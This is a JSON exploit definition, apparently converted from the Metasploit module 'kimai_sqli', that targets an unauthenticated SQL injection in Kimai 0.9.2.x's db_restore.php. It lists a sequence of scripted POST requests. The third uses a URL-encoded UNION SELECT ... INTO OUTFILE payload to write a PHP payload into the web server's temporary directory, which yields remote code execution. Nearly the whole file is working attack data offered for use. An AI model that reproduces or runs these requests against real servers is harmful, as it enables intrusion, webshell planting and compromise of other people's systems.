{
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "path" : "db_restore.php?",
   "informations" : {
      "DESCRIPTION" : "\n\n          This module exploits a SQL injection vulnerability in Kimai version\n\n        0.9.2.x. The 'db_restore.php' file allows unauthenticated users to\n\n        execute arbitrary SQL queries. This module writes a PHP payload to\n\n        disk if the following conditions are met: The PHP configuration must\n\n        have 'display_errors' enabled, Kimai must be configured to use a\n\n        MySQL database running on localhost; and the MySQL user must have\n\n        write permission to the Kimai 'temporary' directory.\n\n      ",
      "OSVDB" : 93547,
      "name" : "KimaiSqli",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PATH" : "db_restore.php",
            "METHOD" : "POST",
            "PAYLOAD" : "submit=create%20backup",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /db_restore.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         },
         "EXPLOIT4" : {
            "TEXT" : "Sending Exploit #4 Request : [POST] /db_restore.php",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "submit=delete&dates%5b%5d=",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "db_restore.php",
            "METHOD" : "POST"
         },
         "EXPLOIT3" : {
            "PATH" : "db_restore.php",
            "METHOD" : "POST",
            "TEXT" : "Sending Exploit #3 Request : [POST] /db_restore.php",
            "PAYLOAD" : "submit=recover&dates%5b%5d=_var%20UNION%20SELECT%20%27%3c%3fphp%20__PAYLOAD__%20%3f%3e%27%20INTO%20OUTFILE%20%27/var/www/UNIX/KIMAI/KimaiSqli//temporary/0IRnBDU3PXJ0kIy.php%27%3b--%20",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         },
         "EXPLOIT1" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "HEADERS" : {},
            "PAYLOAD" : "",
            "METHOD" : "GET",
            "PATH" : ""
         }
      },
      "PAYLOAD" : "",
      "VARIABLES" : {
         "ID" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PATH" : {
            "VALUE" : "/var/www/",
            "DESCRIPTION" : "The path to the web server document root directory"
         }
      },
      "MSF_MODULE" : "kimai_sqli",
      "PATHS" : [
         "db_restore.php",
         "db_restore.php",
         "db_restore.php",
         "kimai/",
         "var/www/"
      ],
      "THE MYSQL TABLE TITLE PREFIX STRING FOR KIMAI TABLES" : "kimai_",
      "PLATFORM" : "UNIX",
      "TYPE" : "MSF",
      "METHOD" : "POST",
      "PATH" : "db_restore.php?"
   },
   "detection" : {},
   "description" : "\n\n          This module exploits a SQL injection vulnerability in Kimai version\n\n        0.9.2.x. The 'db_restore.php' file allows unauthenticated users to\n\n        execute arbitrary SQL queries. This module writes a PHP payload to\n\n        disk if the following conditions are met: The PHP configuration must\n\n        have 'display_errors' enabled, Kimai must be configured to use a\n\n        MySQL database running on localhost; and the MySQL user must have\n\n        write permission to the Kimai 'temporary' directory.\n\n      ",
   "method" : "POST",
   "platform" : "UNIX",
   "payload" : "",
   "variables" : {
      "PATH" : {
         "VALUE" : "/var/www/",
         "DESCRIPTION" : "The path to the web server document root directory"
      },
      "ID" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "the mysql table title prefix string for kimai tables" : "kimai_",
   "msf_module" : "kimai_sqli",
   "name" : "KimaiSqli",
   "paths" : [
      "db_restore.php",
      "db_restore.php",
      "db_restore.php",
      "kimai/",
      "var/www/"
   ],
   "osvdb" : 93547,
   "requests" : {
      "EXPLOIT3" : {
         "PATH" : "db_restore.php",
         "METHOD" : "POST",
         "TEXT" : "Sending Exploit #3 Request : [POST] /db_restore.php",
         "PAYLOAD" : "submit=recover&dates%5b%5d=_var%20UNION%20SELECT%20%27%3c%3fphp%20__PAYLOAD__%20%3f%3e%27%20INTO%20OUTFILE%20%27/var/www/UNIX/KIMAI/KimaiSqli//temporary/0IRnBDU3PXJ0kIy.php%27%3b--%20",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      },
      "EXPLOIT1" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "HEADERS" : {},
         "PAYLOAD" : "",
         "METHOD" : "GET",
         "PATH" : ""
      },
      "EXPLOIT4" : {
         "TEXT" : "Sending Exploit #4 Request : [POST] /db_restore.php",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "submit=delete&dates%5b%5d=",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "db_restore.php",
         "METHOD" : "POST"
      },
      "EXPLOIT2" : {
         "PATH" : "db_restore.php",
         "METHOD" : "POST",
         "PAYLOAD" : "submit=create%20backup",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /db_restore.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   }
}
